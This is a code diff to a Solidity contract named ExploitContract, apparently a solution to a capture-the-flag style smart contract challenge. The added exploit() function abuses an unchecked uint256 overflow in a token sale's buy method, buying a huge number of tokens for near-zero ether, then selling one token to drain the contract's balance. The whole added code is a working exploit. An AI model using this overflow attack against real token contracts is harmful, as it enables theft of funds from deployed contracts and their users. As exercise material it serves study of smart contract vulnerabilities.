@@ -43,4 +43,36 @@ contract ExploitContract {
 
     receive() external payable {}
     // write your exploit functions below
+
+    function exploit() public {
+        // Buy method is vulnerable to overflow
+
+        // 1. Calculate the number of tokens that enough to overflow the uint256
+        uint256 tokenPrice = 1 ether;
+        uint256 numTokens = (type(uint256).max) / tokenPrice + 1;
+
+        // 2. Calculate the value to send
+        uint256 valueToSend = 0;
+        unchecked {
+            valueToSend += numTokens * tokenPrice;
+        }
+
+        // 3. Check if the value to send is less than the token price
+        require(
+            valueToSend < tokenPrice,
+            "Value to send is larger than token price"
+        );
+
+        // 4. Call the buy function with the calculated value and number of tokens
+        tokenSale.buy{value: valueToSend}(numTokens);
+
+        // 5. Check if the contract has more than 1 token
+        require(tokenSale.balanceOf(address(this)) > 1, "Exploit failed");
+
+        // 6. Sell one token
+        tokenSale.sell(1);
+
+        // 7. Check that exploit was successful
+        require(address(tokenSale).balance < tokenPrice, "Exploit failed");
+    }
 }
